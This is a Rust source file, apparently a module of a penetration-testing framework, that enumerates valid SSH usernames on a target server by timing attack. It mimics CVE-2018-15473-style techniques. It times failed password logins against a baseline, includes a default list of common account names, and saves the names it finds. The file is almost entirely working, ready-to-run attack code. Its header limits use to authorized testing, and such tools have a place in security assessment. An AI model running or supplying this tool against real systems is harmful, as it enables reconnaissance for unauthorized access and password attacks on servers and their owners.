//! SSH User Enumeration Module (Timing Attack)
//! 
//! Based on SSHPWN framework - enumerates valid users via timing attack.
//! Inspired by CVE-2018-15473 style attacks.
//!
//! For authorized penetration testing only.

use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    net::TcpStream,
    time::{Duration, Instant},
};

const DEFAULT_SSH_PORT: u16 = 22;
const DEFAULT_TIMEOUT_SECS: u64 = 10;
const DEFAULT_SAMPLES: usize = 3;
const TIMING_THRESHOLD: f64 = 0.3; // 300ms difference threshold

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   SSH User Enumeration (Timing Attack)                            ║".cyan());
    println!("{}", "║   Based on auth2.c timing differences                             ║".cyan());
    println!("{}", "║                                                                   ║".cyan());
    println!("{}", "║   How it works:                                                   ║".cyan());
    println!("{}", "║   - Measures authentication response time for each username       ║".cyan());
    println!("{}", "║   - Valid users often have different timing than invalid          ║".cyan());
    println!("{}", "║   - Compares against baseline (known invalid user)                ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Normalize target for connection
fn normalize_target(target: &str) -> String {
    let trimmed = target.trim();
    if trimmed.starts_with('[') && trimmed.contains(']') {
        trimmed.to_string()
    } else if trimmed.contains(':') && !trimmed.contains('.') {
        format!("[{}]", trimmed)
    } else {
        trimmed.to_string()
    }
}

/// Time a single authentication attempt
fn time_auth_attempt(host: &str, port: u16, username: &str, timeout_secs: u64) -> Option<f64> {
    let addr = format!("{}:{}", host, port);
    
    let start = Instant::now();
    
    let tcp = match TcpStream::connect_timeout(
        &addr.parse().ok()?,
        Duration::from_secs(timeout_secs),
    ) {
        Ok(s) => s,
        Err(_) => return None,
    };
    
    let _ = tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs)));
    let _ = tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs)));
    
    let mut sess = match Session::new() {
        Ok(s) => s,
        Err(_) => return None,
    };
    
    sess.set_tcp_stream(tcp);
    if sess.handshake().is_err() {
        return None;
    }
    
    // Try authentication with invalid password
    let invalid_password = format!("invalid_{}_{}", std::process::id(), start.elapsed().as_nanos());
    let _ = sess.userauth_password(username, &invalid_password);
    
    let elapsed = start.elapsed().as_secs_f64();
    Some(elapsed)
}

/// Sample authentication timing for a username
fn sample_auth_timing(host: &str, port: u16, username: &str, samples: usize, timeout_secs: u64) -> Option<f64> {
    let mut times = Vec::new();
    
    for _ in 0..samples {
        if let Some(t) = time_auth_attempt(host, port, username, timeout_secs) {
            times.push(t);
        }
        // Small delay between samples
        std::thread::sleep(Duration::from_millis(100));
    }
    
    if times.is_empty() {
        return None;
    }
    
    // Return average
    Some(times.iter().sum::<f64>() / times.len() as f64)
}

/// Load usernames from file
fn load_usernames(path: &str) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    let usernames: Vec<String> = reader
        .lines()
        .filter_map(|l| l.ok())
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect();
    Ok(usernames)
}

/// Enumerate valid users via timing attack
pub async fn enumerate_users(
    host: &str,
    port: u16,
    usernames: &[String],
    samples: usize,
    timeout_secs: u64,
    threshold: f64,
) -> Vec<String> {
    println!("{}", format!("[*] Enumerating users on {}:{} (timing attack)", host, port).cyan());
    println!("{}", format!("[*] Testing {} usernames with {} samples each", usernames.len(), samples).cyan());
    println!("{}", format!("[*] Timing threshold: {:.3}s", threshold).cyan());
    println!();
    
    // Establish baseline with known-invalid user
    let baseline_user = format!("nonexistent_{}_{}", std::process::id(), Instant::now().elapsed().as_nanos());
    println!("{}", "[*] Establishing baseline timing...".cyan());
    
    let baseline = match sample_auth_timing(host, port, &baseline_user, samples, timeout_secs) {
        Some(t) => {
            println!("{}", format!("[*] Baseline timing: {:.3}s", t).cyan());
            t
        }
        None => {
            println!("{}", "[-] Failed to establish baseline - cannot reach target".red());
            return Vec::new();
        }
    };
    
    println!();
    println!("{}", "[*] Testing usernames...".cyan());
    
    let mut valid_users = Vec::new();
    
    for (i, user) in usernames.iter().enumerate() {
        print!("\r[{}/{}] Testing: {}          ", i + 1, usernames.len(), user);
        let _ = std::io::stdout().flush();
        
        match sample_auth_timing(host, port, user, samples, timeout_secs) {
            Some(t) => {
                let diff = t - baseline;
                if diff.abs() > threshold {
                    println!("\r{}", format!("[+] Valid user: {} (timing diff: {:+.3}s)", user, diff).green());
                    valid_users.push(user.clone());
                }
            }
            None => {
                // Connection failed, skip
            }
        }
    }
    
    println!();
    println!("{}", "=== Results ===".cyan().bold());
    if valid_users.is_empty() {
        println!("{}", "[-] No valid users found via timing attack".yellow());
        println!("{}", "[*] Note: This technique may not work on all SSH configurations".dimmed());
    } else {
        println!("{}", format!("[+] Found {} valid user(s):", valid_users.len()).green());
        for user in &valid_users {
            println!("    - {}", user.green());
        }
    }
    
    valid_users
}

/// Prompt helper
fn prompt(message: &str) -> Result<String> {
    print!("{}: ", message);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    Ok(input.trim().to_string())
}

fn prompt_default(message: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", message, default);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(default.to_string())
    } else {
        Ok(trimmed.to_string())
    }
}

fn prompt_yes_no(message: &str, default: bool) -> Result<bool> {
    let hint = if default { "Y/n" } else { "y/N" };
    print!("{} [{}]: ", message, hint);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let trimmed = input.trim().to_lowercase();
    match trimmed.as_str() {
        "" => Ok(default),
        "y" | "yes" => Ok(true),
        "n" | "no" => Ok(false),
        _ => Ok(default),
    }
}

/// Default usernames to test
const DEFAULT_USERNAMES: &[&str] = &[
    "root", "admin", "user", "test", "guest",
    "ubuntu", "www-data", "daemon", "bin", "sys",
    "nobody", "mysql", "postgres", "oracle", "ftp",
    "ssh", "apache", "nginx", "tomcat", "redis",
];

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let host = normalize_target(target);
    println!("{}", format!("[*] Target: {}", host).cyan());
    
    // Get parameters
    let port: u16 = prompt_default("SSH Port", "22")?.parse().unwrap_or(DEFAULT_SSH_PORT);
    let samples: usize = prompt_default("Samples per username", "3")?.parse().unwrap_or(DEFAULT_SAMPLES);
    let timeout: u64 = prompt_default("Connection timeout (seconds)", "10")?.parse().unwrap_or(DEFAULT_TIMEOUT_SECS);
    let threshold: f64 = prompt_default("Timing threshold (seconds)", "0.3")?.parse().unwrap_or(TIMING_THRESHOLD);
    
    // Get usernames
    let mut usernames: Vec<String> = Vec::new();
    
    if prompt_yes_no("Load usernames from file?", false)? {
        let file_path = prompt("Username file path")?;
        if !file_path.is_empty() {
            match load_usernames(&file_path) {
                Ok(loaded) => {
                    println!("{}", format!("[*] Loaded {} usernames from file", loaded.len()).cyan());
                    usernames.extend(loaded);
                }
                Err(e) => {
                    println!("{}", format!("[-] Failed to load file: {}", e).red());
                }
            }
        }
    }
    
    // Add default usernames?
    if usernames.is_empty() || prompt_yes_no("Also test default usernames?", true)? {
        for user in DEFAULT_USERNAMES {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
        }
    }
    
    if usernames.is_empty() {
        return Err(anyhow!("No usernames to test"));
    }
    
    println!();
    println!("{}", format!("[*] Will test {} usernames", usernames.len()).cyan());
    println!();
    
    // Run enumeration
    let valid_users = enumerate_users(&host, port, &usernames, samples, timeout, threshold).await;
    
    // Save results?
    if !valid_users.is_empty() && prompt_yes_no("Save valid users to file?", true)? {
        let output_path = prompt_default("Output file", "valid_ssh_users.txt")?;
        let mut file = File::create(&output_path)?;
        writeln!(file, "# Valid SSH users for {}:{}", host, port)?;
        for user in &valid_users {
            writeln!(file, "{}", user)?;
        }
        println!("{}", format!("[+] Saved to: {}", output_path).green());
    }
    
    println!();
    println!("{}", "[*] SSH user enumeration complete".green());
    
    Ok(())
}

